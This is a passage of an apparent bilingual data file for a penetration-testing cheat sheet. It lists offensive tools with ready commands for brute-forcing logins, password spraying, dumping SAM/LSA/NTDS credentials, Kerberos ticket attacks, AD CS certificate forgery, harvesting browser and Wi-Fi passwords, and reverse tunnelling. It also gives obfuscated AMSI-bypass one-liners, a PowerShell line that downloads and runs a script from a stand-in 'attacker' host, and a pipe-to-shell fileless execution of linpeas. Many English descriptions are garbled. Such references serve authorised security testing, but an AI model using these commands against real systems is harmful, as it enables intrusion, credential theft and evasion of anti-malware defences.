        name: { zh: 'VNC爆破', en: 'VNC Brute Force' },
        command: 'crowbar -b vnckey -s target_ip/32 -p password -k /path/to/keys/',
        description: { zh: 'VNC认证暴力破解', en: 'VNCAuthenticationBrute Force' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/galkan/crowbar']
  },
  {
    id: 'patator',
    name: 'Patator',
    description: { zh: '多用途模块化暴力破解工具，支持数十种协议', en: 'Multi-purpose modular brute-force tool supporting dozens of protocols' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install patator / pip3 install patator',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'patator ssh_login host=target_ip user=FILE0 password=FILE1 0=users.txt 1=passwords.txt',
        description: { zh: 'SSH登录暴力破解', en: 'SSHLoginBrute Force' },
        syntaxBreakdown: [
          { part: 'ssh_login', explanation: { zh: '使用SSH登录模块', en: 'UseSSHLoginModule' }, type: 'command' },
          { part: 'FILE0/FILE1', explanation: { zh: '引用字典文件(0和1编号)', en: 'Reference dictionary files (numbered 0 and 1)' }, type: 'variable' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'HTTP表单爆破', en: 'HTTP Form Brute Force' },
        command: 'patator http_fuzz url="https://target.com/login" method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt -x ignore:fgrep="Login failed"',
        description: { zh: 'HTTP登录表单暴力破解', en: 'HTTPLogintableSingleBrute Force' },
        platform: 'all'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'patator ftp_login host=target_ip user=admin password=FILE0 0=passwords.txt',
        description: { zh: 'FTP密码暴力破解', en: 'FTPPasswordBrute Force' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/lanjelot/patator']
  },
  {
    id: 'crackstation',
    name: 'CrackStation',
    description: { zh: '在线哈希查询和离线超大字典', en: 'Online hash lookup and offline mega-dictionary' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '在线: https://crackstation.net / 下载字典: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm', en: 'Online: https://crackstation.net / Download wordlist: https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm' },
    commands: [
      {
        name: { zh: '在线查询', en: 'Online Lookup' },
        command: '# 访问 https://crackstation.net\n# 输入哈希值(支持MD5/SHA1/SHA256等)\n# 支持批量查询(每行一个哈希)',
        description: { zh: '在线哈希值反查明文密码', en: 'Online reverse hash lookup for plaintext passwords' },
        platform: 'all'
      },
      {
        name: { zh: '下载字典', en: 'Download Wordlist' },
        command: '# CrackStation字典(15GB+):\n# https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm\n# 配合hashcat使用:\nhashcat -m 0 hashes.txt crackstation.txt',
        description: { zh: '使用CrackStation超大字典离线破解', en: 'Offline cracking with the CrackStation mega-dictionary' },
        platform: 'all'
      }
    ],
    references: ['https://crackstation.net']
  },
  {
    id: 'seclists',
    name: { zh: 'SecLists字典', en: 'SecListsDictionary' },
    description: { zh: '安全测试人员必备的字典集合(目录、密码、用户名、Payload等)', en: 'Essential wordlist collection for security testers (directories, passwords, usernames, payloads, etc.)' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install seclists / git clone https://github.com/danielmiessler/SecLists',
    commands: [
      {
        name: { zh: '常用路径', en: 'Common Paths' },
        command: '# 目录字典:\n/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt\n\n# 密码字典:\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt\n\n# 用户名:\n/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
        description: { zh: 'SecLists常用字典路径', en: 'SecListsCommonDictionaryPath' },
        platform: 'linux'
      },
      {
        name: { zh: '特殊用途', en: 'Special Purpose' },
        command: '# Fuzzing Payload:\n/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt\n\n# 子域名:\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n\n# 参数名:\n/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt',
        description: { zh: '特殊用途字典(LFI/SQLi/子域名/参数)', en: 'Special PurposeDictionary(LFI/SQLi/Sub-Domain name/Parameter)' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/danielmiessler/SecLists']
  },
  {
    id: 'rockyou',
    name: { zh: 'RockYou字典', en: 'RockYouDictionary' },
    description: { zh: '来自2009年RockYou数据泄露的经典密码字典(1400万+)', en: 'Classic password dictionary from the 2009 RockYou data breach (14M+ entries)' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: '# Kali自带: gzip -d /usr/share/wordlists/rockyou.txt.gz / 或下载: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt', en: '# Kali built-in: gzip -d /usr/share/wordlists/rockyou.txt.gz / Or download: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt' },
    commands: [
      {
        name: { zh: '解压使用', en: 'Extract and Use' },
        command: 'gzip -d /usr/share/wordlists/rockyou.txt.gz\nwc -l /usr/share/wordlists/rockyou.txt  # 约14344392行',
        description: { zh: '解压Kali自带的rockyou字典', en: 'Decompress the Kali built-in rockyou dictionary' },
        platform: 'linux'
      },
      {
        name: { zh: '配合工具', en: 'Combined with Tools' },
        command: '# Hashcat:\nhashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# John:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n\n# Hydra:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target',
        description: { zh: '配合各种密码破解工具使用', en: 'Use with various password cracking tools' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/brannondorsey/naive-hashcat/releases']
  },
  {
    id: 'netexec',
    name: 'NetExec',
    description: { zh: 'CrackMapExec的继任者，网络渗透测试自动化工具', en: 'Successor to CrackMapExec, automated network penetration testing tool' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install netexec / pipx install netexec',
    commands: [
      {
        name: { zh: 'SMB枚举', en: 'SMB Enumeration' },
        command: 'nxc smb 10.0.0.0/24 -u user -p password --shares\nnxc smb 10.0.0.0/24 -u user -p password --users',
        description: { zh: 'SMB共享和用户枚举', en: 'SMBShares and User Enumeration' },
        syntaxBreakdown: [
          { part: 'nxc', explanation: { zh: 'NetExec命令行工具', en: 'NetExecCommandlineTools' }, type: 'command' },
          { part: 'smb', explanation: { zh: '指定SMB协议', en: 'specifiedSMBProtocol' }, type: 'parameter' },
          { part: '--shares', explanation: { zh: '枚举共享目录', en: 'EnumerationSharesDirectory' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '密码喷射', en: 'Password Spraying' },
        command: 'nxc smb 10.0.0.0/24 -u users.txt -p "Password123!" --continue-on-success',
        description: { zh: '使用单一密码对多用户进行喷射', en: 'Spray a single password against multiple users' },
        platform: 'all'
      },
      {
        name: { zh: '命令执行', en: 'Command Execution' },
        command: 'nxc smb target_ip -u admin -p password -x "whoami"\nnxc winrm target_ip -u admin -p password -X "Get-Process"',
        description: { zh: '通过SMB/WinRM执行命令', en: 'throughSMB/WinRMExecute Command' },
        platform: 'all'
      },
      {
        name: { zh: '提取凭证', en: 'Extract Credentials' },
        command: 'nxc smb target_ip -u admin -p password --sam\nnxc smb target_ip -u admin -p password --lsa\nnxc smb target_ip -u admin -p password --ntds',
        description: { zh: '提取SAM/LSA/NTDS中的凭证', en: 'ExtractSAM/LSA/NTDSMiddle Credentials' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/Pennyw0rth/NetExec']
  },
  {
    id: 'ligolo-ng',
    name: 'Ligolo-ng',
    description: { zh: '高级内网隧道代理工具，基于TUN接口', en: 'AdvancedInternal networkTunneling & ProxyTools, Based onTUNInterface' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/nicocha30/ligolo-ng/releases', en: 'Download: https://github.com/nicocha30/ligolo-ng/releases' },
    commands: [
      {
        name: { zh: '攻击机设置', en: 'Attacker Setup' },
        command: '# 创建TUN接口\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# 启动代理服务\n./proxy -selfcert -laddr 0.0.0.0:11601',
        description: { zh: '在攻击机上配置TUN接口和启动代理', en: 'Configure TUN interface and start proxy on the attacker machine' },
        syntaxBreakdown: [
          { part: 'ip tuntap add', explanation: { zh: '创建TUN虚拟网络接口', en: 'Create a TUN virtual network interface' }, type: 'command' },
          { part: '-selfcert', explanation: { zh: '使用自签名证书', en: 'Use a self-signed certificate' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '目标机连接', en: 'Target Connection' },
        command: './agent -connect attacker_ip:11601 -ignore-cert',
        description: { zh: '在目标机运行Agent连接回攻击机', en: 'Run agent on target to connect back to the attacker' },
        platform: 'all'
      },
      {
        name: { zh: '添加路由', en: 'Add Route' },
        command: '# 在Ligolo控制台:\nsession\nstart\n# 在攻击机添加路由:\nsudo ip route add 10.10.10.0/24 dev ligolo',
        description: { zh: '配置路由实现内网直通', en: 'Configure routes for direct intranet access' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/nicocha30/ligolo-ng']
  },
  {
    id: 'sharphound',
    name: 'SharpHound',
    description: { zh: 'BloodHound的C#数据收集器，在Windows域内收集AD信息', en: 'BloodHound C#DataCollectTool, in WindowsDomainInsideCollectADInformation' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/BloodHoundAD/SharpHound/releases', en: 'Download: https://github.com/BloodHoundAD/SharpHound/releases' },
    commands: [
      {
        name: { zh: '全量收集', en: 'Full Collection' },
        command: '.\\SharpHound.exe -c All',
        description: { zh: '收集所有AD域信息(用户/组/ACL/Session等)', en: 'CollectallADDomain Info(Users/Groups/ACL/Session etc.)' },
        syntaxBreakdown: [
          { part: '-c All', explanation: { zh: '收集所有类型的数据', en: 'CollectallType Data' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '隐蔽收集', en: 'Stealth Collection' },
        command: '.\\SharpHound.exe -c DCOnly --NoSaveCache --RandomFilenames --MemCache',
        description: { zh: '仅从DC收集，不保存缓存，随机文件名', en: 'Only from DCCollect, not SaveCache, randomFilename' },
        platform: 'windows'
      },
      {
        name: { zh: 'Session收集', en: 'Session Collection' },
        command: '.\\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00 --LoopInterval 00:05:00',
        description: { zh: '循环收集Session信息(2小时，每5分钟一次)', en: 'Periodically collect session info (2 hours, every 5 minutes)' },
        platform: 'windows'
      },
      {
        name: { zh: '指定域', en: 'Specify Domain' },
        command: '.\\SharpHound.exe -c All -d child.domain.com --LdapUsername user --LdapPassword pass',
        description: { zh: '收集指定子域的信息', en: 'CollectspecifiedSub-Domain Information' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/BloodHoundAD/SharpHound']
  },
  {
    id: 'bloodhound-python',
    name: 'BloodHound-Python',
    description: { zh: 'BloodHound的Python数据收集器，可从Linux远程收集AD信息', en: 'BloodHound PythonDataCollectTool, Can from LinuxRemote CollectionADInformation' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install bloodhound',
    commands: [
      {
        name: { zh: '远程收集', en: 'Remote Collection' },
        command: 'bloodhound-python -d domain.com -u user -p password -ns dc_ip -c All',
        description: { zh: '从Linux远程收集AD域全量信息', en: 'Remotely collect full AD domain information from Linux' },
        syntaxBreakdown: [
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' },
          { part: '-ns', explanation: { zh: 'DNS服务器(通常是DC)', en: 'DNSServer(Usually is DC)' }, type: 'parameter' },
          { part: '-c All', explanation: { zh: '收集所有类型数据', en: 'CollectallTypeData' }, type: 'parameter' },
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用哈希', en: 'Using Hash' },
        command: 'bloodhound-python -d domain.com -u user --hashes aad3b435b51404eeaad3b435b51404ee:ntlm_hash -ns dc_ip -c All',
        description: { zh: '使用NTLM哈希进行Pass-the-Hash收集', en: 'UseNTLMhash perform Pass-the-HashCollect' },
        platform: 'linux'
      },
      {
        name: { zh: '指定收集类型', en: 'Specify Collection Type' },
        command: 'bloodhound-python -d domain.com -u user -p pass -ns dc_ip -c Group,LocalAdmin,Session',
        description: { zh: '仅收集组、本地管理员和会话信息', en: 'OnlyCollectGroups, Local Admins and SessionInformation' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/fox-it/BloodHound.py']
  },
  {
    id: 'rubeus',
    name: 'Rubeus',
    description: { zh: 'Kerberos攻击工具集，用于票据操作和Kerberos攻击', en: 'Kerberos attack toolkit for ticket operations and Kerberos attacks' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译: https://github.com/GhostPack/Rubeus / 或使用预编译版', en: 'Compile: https://github.com/GhostPack/Rubeus / Or use pre-compiled binaries' },
    commands: [
      {
        name: 'Kerberoasting',
        command: 'Rubeus.exe kerberoast /outfile:hashes.txt\nRubeus.exe kerberoast /user:svc_sql /outfile:hash.txt',
        description: { zh: '请求服务票据用于离线破解', en: 'Request service tickets for offline cracking' },
        syntaxBreakdown: [
          { part: 'kerberoast', explanation: { zh: '请求TGS票据进行离线破解', en: 'Request TGS tickets for offline cracking' }, type: 'command' },
          { part: '/outfile', explanation: { zh: '保存哈希到文件', en: 'Savehash to File' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: 'AS-REP Roasting',
        command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
        description: { zh: '对不需要预认证的账户请求AS-REP', en: 'for No Pre-auth Required AccountRequestAS-REP' },
        platform: 'windows'
      },
      {
        name: 'Pass-the-Ticket',
        command: 'Rubeus.exe ptt /ticket:base64_ticket\nRubeus.exe ptt /ticket:ticket.kirbi',
        description: { zh: '导入Kerberos票据', en: 'ImportKerberosTicket' },
        platform: 'windows'
      },
      {
        name: { zh: '请求TGT', en: 'Request TGT' },
        command: 'Rubeus.exe asktgt /user:user /password:pass /enctype:aes256 /ptt\nRubeus.exe asktgt /user:user /rc4:ntlm_hash /ptt',
        description: { zh: '使用密码或哈希请求TGT票据', en: 'UsePassword or hashRequest TGTTicket' },
        platform: 'windows'
      },
      {
        name: { zh: '委派攻击', en: 'Delegation Attack' },
        command: 'Rubeus.exe s4u /user:svc$ /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt',
        description: { zh: 'S4U约束委派攻击', en: 'S4UConstrained Delegation Attack' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/GhostPack/Rubeus']
  },
  {
    id: 'certipy',
    name: 'Certipy',
    description: { zh: 'AD CS(Active Directory证书服务)攻击工具', en: 'AD CS(Active DirectoryCertificateService)AttackTools' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'pip3 install certipy-ad',
    commands: [
      {
        name: { zh: '枚举证书模板', en: 'Enumerate Certificate Templates' },
        command: 'certipy find -u user@domain.com -p password -dc-ip dc_ip -enabled -vulnerable',
        description: { zh: '枚举可利用的证书模板', en: 'EnumerationCanExploitation CertificateTemplate' },
        syntaxBreakdown: [
          { part: 'find', explanation: { zh: '枚举模式', en: 'EnumerationMode' }, type: 'command' },
          { part: '-vulnerable', explanation: { zh: '仅显示可利用的模板', en: 'OnlyDisplayCanExploitation Template' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'ESC1攻击', en: 'ESC1 Attack' },
        command: 'certipy req -u user@domain.com -p password -ca CA-NAME -template VULN_TEMPLATE -upn admin@domain.com',
        description: { zh: 'ESC1: 利用允许SAN的模板伪造管理员证书', en: 'ESC1: ExploitationAllowSAN TemplateForgeManagementMemberCertificate' },
        platform: 'all'
      },
      {
        name: { zh: '认证获取哈希', en: 'Authenticate to Get Hash' },
        command: 'certipy auth -pfx admin.pfx -dc-ip dc_ip',
        description: { zh: '使用证书进行PKINIT认证获取NT Hash', en: 'UseCertificate perform PKINITAuthenticationObtainNT Hash' },
        platform: 'all'
      },
      {
        name: 'Shadow Credentials',
        command: 'certipy shadow auto -u user@domain.com -p password -account target_user',
        description: { zh: 'Shadow Credentials攻击获取目标用户凭证', en: 'Shadow CredentialsAttackObtainTargetUsersCredentials' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/ly4k/Certipy']
  },
  {
    id: 'lazagne-tool',
    name: 'LaZagne',
    description: { zh: '自动化本地密码恢复工具，支持数十种应用', en: 'Automated local password recovery tool supporting dozens of applications' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/AlessandroZ/LaZagne/releases', en: 'Download: https://github.com/AlessandroZ/LaZagne/releases' },
    commands: [
      {
        name: { zh: '全量提取', en: 'Full Extraction' },
        command: 'lazagne.exe all',
        description: { zh: '提取所有支持应用的密码', en: 'ExtractallsupportsApplication Password' },
        syntaxBreakdown: [
          { part: 'all', explanation: { zh: '搜索所有支持的应用程序', en: 'Searchallsupports Application' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '指定类别', en: 'Specify Category' },
        command: 'lazagne.exe browsers\nlazagne.exe wifi\nlazagne.exe databases\nlazagne.exe sysadmin',
        description: { zh: '仅提取指定类别的密码', en: 'OnlyExtractSpecify Category Password' },
        platform: 'windows'
      },
      {
        name: { zh: 'Linux版本', en: 'Linux Version' },
        command: 'python3 lazagne.py all\npython3 lazagne.py browsers',
        description: { zh: 'Linux版本使用方式', en: 'Linux VersionUseMethod' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/AlessandroZ/LaZagne']
  },
  {
    id: 'seatbelt',
    name: 'Seatbelt',
    description: { zh: 'C#安全审计工具，快速收集Windows系统安全相关信息', en: 'C# security audit tool for rapidly collecting Windows system security information' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '编译: https://github.com/GhostPack/Seatbelt / 或使用预编译版', en: 'Compile: https://github.com/GhostPack/Seatbelt / Or use pre-compiled binaries' },
    commands: [
      {
        name: { zh: '全量审计', en: 'Full Audit' },
        command: 'Seatbelt.exe -group=all -full',
        description: { zh: '执行所有安全检查', en: 'ExecuteallSecurityCheck' },
        syntaxBreakdown: [
          { part: '-group=all', explanation: { zh: '运行所有检查组', en: 'RunallCheckGroups' }, type: 'parameter' },
          { part: '-full', explanation: { zh: '详细输出模式', en: 'Verbose OutputMode' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '快速检查', en: 'Quick Check' },
        command: 'Seatbelt.exe -group=system -group=user',
        description: { zh: '检查系统和用户相关安全配置', en: 'CheckSystem and UsersrelatedSecurity Configuration' },
        platform: 'windows'
      },
      {
        name: { zh: '指定模块', en: 'Specify Module' },
        command: 'Seatbelt.exe CredEnum WindowsVault SavedRDPConnections RecentFiles',
        description: { zh: '运行指定的检查模块', en: 'Runspecified CheckModule' },
        platform: 'windows'
      },
      {
        name: { zh: '远程执行', en: 'Remote Execution' },
        command: 'Seatbelt.exe -group=remote -computername=target -username=admin -password=pass',
        description: { zh: '远程执行安全审计', en: 'Remote ExecutionSecurityAudit' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/GhostPack/Seatbelt']
  },
  {
    id: 'winpeas',
    name: 'WinPEAS',
    description: { zh: 'Windows权限提升辅助脚本，自动发现提权路径', en: 'Windows Privilege EscalationauxiliaryScript, AutomaticDiscoverPrivilege escalationPath' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: { zh: '下载: https://github.com/carlospolop/PEASS-ng/releases', en: 'Download: https://github.com/carlospolop/PEASS-ng/releases' },
    commands: [
      {
        name: { zh: '全量扫描', en: 'Full Scan' },
        command: 'winpeasany.exe',
        description: { zh: '执行所有Windows提权检查', en: 'ExecuteallWindowsPrivilege escalationCheck' },
        platform: 'windows'
      },
      {
        name: { zh: '快速模式', en: 'Fast Mode' },
        command: 'winpeasany.exe fast',
        description: { zh: '快速模式(跳过耗时检查)', en: 'Fast mode (skip time-consuming checks)' },
        platform: 'windows'
      },
      {
        name: { zh: '指定检查', en: 'Specify Check' },
        command: 'winpeasany.exe servicesinfo\nwinpeasany.exe userinfo\nwinpeasany.exe systeminfo',
        description: { zh: '仅检查指定类别', en: 'OnlyCheckSpecify Category' },
        platform: 'windows'
      },
      {
        name: { zh: '输出到文件', en: 'Output to File' },
        command: 'winpeasany.exe log=output.txt\nwinpeasany.exe /quiet > output.txt 2>&1',
        description: { zh: '将结果保存到文件', en: 'will ResultSave to File' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'linpeas',
    name: 'LinPEAS',
    description: { zh: 'Linux权限提升辅助脚本，自动发现提权路径', en: 'Linux Privilege EscalationauxiliaryScript, AutomaticDiscoverPrivilege escalationPath' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh',
    commands: [
      {
        name: { zh: '全量扫描', en: 'Full Scan' },
        command: './linpeas.sh',
        description: { zh: '执行所有Linux提权检查', en: 'ExecuteallLinuxPrivilege escalationCheck' },
        platform: 'linux'
      },
      {
        name: { zh: '无网络模式', en: 'Offline Mode' },
        command: './linpeas.sh -a -o output.txt',
        description: { zh: '全面扫描(含耗时检查)并输出到文件', en: 'Comprehensive scan (including time-consuming checks) with file output' },
        platform: 'linux'
      },
      {
        name: { zh: '内存加载', en: 'Memory Load' },
        command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash',
        description: { zh: '无文件落地直接执行', en: 'Fileless execution directly in memory' },
        platform: 'linux'
      },
      {
        name: { zh: '指定检查', en: 'Specify Check' },
        command: './linpeas.sh -s\n# -s: 仅超快速检查\n# -P: 仅密码相关\n# -n: 仅网络信息',
        description: { zh: '指定检查类别', en: 'Specify check category' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'powershell-amsi',
    name: { zh: 'PowerShell AMSI绕过', en: 'PowerShell AMSI Bypass' },
    description: { zh: 'Windows AMSI(反恶意软件扫描接口)绕过技术集合', en: 'Windows AMSI (Anti-Malware Scan Interface) bypass technique collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '基础绕过', en: 'Basic Bypass' },
        command: '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
        description: { zh: '通过反射修改amsiInitFailed标志位', en: 'throughReflectionModifyamsiInitFailedflagbit' },
        platform: 'windows'
      },
      {
        name: { zh: 'Matt Graeber方式', en: 'Matt Graeber Method' },
        command: '$a=[Ref].Assembly.GetType(\'System.Management.Automation.Am\'+\'siUt\'+\'ils\');$b=$a.GetField(\'am\'+\'siIn\'+\'itFa\'+\'iled\',\'NonPublic,Static\');$b.SetValue($null,$true)',
        description: { zh: '字符串拼接绕过AMSI签名检测', en: 'stringConcatenateBypassAMSISignatureDetection' },
        platform: 'windows'
      },
      {
        name: { zh: '内存补丁', en: 'Memory Patch' },
        command: '$w=\'System.Management.Automation.A\'+\'msiUtils\';[Runtime.InteropServices.Marshal]::WriteByte(([Ref].Assembly.GetType($w).GetField(\'a\'+\'msiSession\',[Reflection.BindingFlags]\'NonPublic,Static\').GetValue($null)),0x80)',
        description: { zh: '直接修改内存中的AMSI缓冲区', en: 'Directly modify the AMSI buffer in memory' },
        platform: 'windows'
      },
      {
        name: { zh: 'PowerShell降级', en: 'PowerShell Downgrade' },
        command: 'powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/script.ps1\')"',
        description: { zh: '使用PowerShell v2(无AMSI)运行脚本', en: 'UsePowerShell v2( no AMSI)RunScript' },
        platform: 'windows'
      }
    ],
    references: ['https://amsi.fail']
  },
  {
    id: 'wmic-cmd',
    name: { zh: 'WMIC命令', en: 'WMICCommand' },
    description: { zh: 'Windows Management Instrumentation命令行工具', en: 'Windows Management InstrumentationCommandlineTools' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '系统信息', en: 'System Info' },
        command: 'wmic os get Caption,Version,BuildNumber,OSArchitecture\nwmic computersystem get Name,Domain,Manufacturer,Model',
        description: { zh: '获取操作系统和计算机信息', en: 'ObtainOperating System and ComputersInformation' },
        syntaxBreakdown: [
          { part: 'wmic', explanation: { zh: 'WMI命令行工具', en: 'WMICommandlineTools' }, type: 'command' },
          { part: 'os get', explanation: { zh: '查询操作系统对象属性', en: 'QueryOperating System for Objectproperty' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '进程管理', en: 'Process Management' },
        command: 'wmic process list brief\nwmic process where name="cmd.exe" get processid,commandline\nwmic process call create "cmd.exe /c whoami > C:\\temp\\out.txt"',
        description: { zh: '查询和创建进程', en: 'Query and CreateProcess' },
        platform: 'windows'
      },
      {
        name: { zh: '服务管理', en: 'Service Management' },
        command: 'wmic service list brief\nwmic service where "startmode=\'auto\' and state=\'stopped\'" get name,startname',
        description: { zh: '查询服务信息', en: 'QueryServiceInformation' },
        platform: 'windows'
      },
      {
        name: { zh: '远程执行', en: 'Remote Execution' },
        command: 'wmic /node:target_ip /user:admin /password:pass process call create "cmd.exe /c whoami"',
        description: { zh: '远程WMI命令执行', en: 'RemoteWMICommand Execution' },
        platform: 'windows'
      },
      {
        name: { zh: '已安装软件', en: 'Installed Software' },
        command: 'wmic product get name,version\nwmic qfe list',
        description: { zh: '列出已安装软件和补丁', en: 'ListInstalled Software and Patch' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic']
  },
  {
    id: 'dsquery',
    name: { zh: 'DSQuery命令', en: 'DSQueryCommand' },
    description: { zh: 'Active Directory查询命令行工具', en: 'Active DirectoryQueryCommandlineTools' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      {
        name: { zh: '查询用户', en: 'Query Users' },
        command: 'dsquery user -limit 0\ndsquery user -name *admin*\ndsquery user -inactive 4',
        description: { zh: '查询域用户(所有/管理员/不活跃)', en: 'Query domain users (all/admins/inactive)' },
        syntaxBreakdown: [
          { part: 'dsquery user', explanation: { zh: '查询AD用户对象', en: 'QueryADUsers for Object' }, type: 'command' },
          { part: '-limit 0', explanation: { zh: '不限制返回数量', en: 'not RestrictReturncount' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: '查询计算机', en: 'Query Computers' },
        command: 'dsquery computer -limit 0\ndsquery computer -name *server*',
        description: { zh: '查询域内计算机对象', en: 'QueryDomainInsideComputers for Object' },
        platform: 'windows'
      },
      {
        name: { zh: '查询组', en: 'Query Groups' },
        command: 'dsquery group -name "Domain Admins"\ndsquery group | dsget group -members',
        description: { zh: '查询域组及成员', en: 'Query domain groups and members' },
        platform: 'windows'
      },
      {
        name: { zh: '查询OU', en: 'Query OUs' },
        command: 'dsquery ou\ndsquery * "DC=domain,DC=com" -filter "(objectclass=organizationalUnit)" -attr name',
        description: { zh: '查询组织单位结构', en: 'Query organizational unit structure' },
        platform: 'windows'
      },
      {
        name: { zh: 'LDAP查询', en: 'LDAP Query' },
        command: 'dsquery * -filter "(&(objectClass=user)(adminCount=1))" -attr sAMAccountName -limit 0',
        description: { zh: '自定义LDAP过滤器查询特权用户', en: 'Custom LDAP filter to query privileged users' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)']
  },
  {
    id: 'adexplorer',
    name: 'AD Explorer',
    description: { zh: 'Sysinternals出品的Active Directory浏览器和快照工具', en: 'Sysinternals Active Directory browser and snapshot tool' },
    category: { zh: '系统命令', en: 'System Commands' },
    installation: { zh: '下载: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer', en: 'Download: https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer' },
    commands: [
      {
        name: { zh: '连接AD', en: 'Connect to AD' },
        command: 'ADExplorer.exe\n# 输入DC地址: dc.domain.com\n# 输入凭证: domain\\user / password\n# 或使用当前域凭证直连',
        description: { zh: '连接到Active Directory进行浏览', en: 'Connect to Active Directory for browsing' },
        platform: 'windows'
      },
      {
        name: { zh: '创建快照', en: 'Create Snapshot' },
        command: 'ADExplorer.exe -snapshot "" output.snp\n# 或在GUI中: File > Create Snapshot',
        description: { zh: '创建AD数据库离线快照(可用BloodHound分析)', en: 'Create an offline AD database snapshot (compatible with BloodHound)' },
        platform: 'windows'
      },
      {
        name: { zh: '比较快照', en: 'Compare Snapshots' },
        command: '# GUI操作: File > Compare\n# 选择两个时间点的快照文件\n# 对比AD变更(新用户/权限变更等)',
        description: { zh: '对比两个快照发现AD变更', en: 'Compare two snapshots to discover AD changes' },
        platform: 'windows'
      }
    ],
    references: ['https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer']
  },
  {
    id: 'ldeep',
    name: 'ldeep',
    description: { zh: 'LDAP深度枚举工具，用于从Linux远程查询AD信息', en: 'LDAPdepthEnumerationTools, used for from LinuxRemoteQueryADInformation' },
    category: { zh: '系统命令', en: 'System Commands' },
    installation: 'pip3 install ldeep',
    commands: [
      {
        name: { zh: '用户枚举', en: 'User Enumeration' },
        command: 'ldeep ldap -u user -p password -d domain.com -s dc_ip users\nldeep ldap -u user -p password -d domain.com -s dc_ip users -v',
        description: { zh: '枚举域用户', en: 'EnumerationDomain Users' },
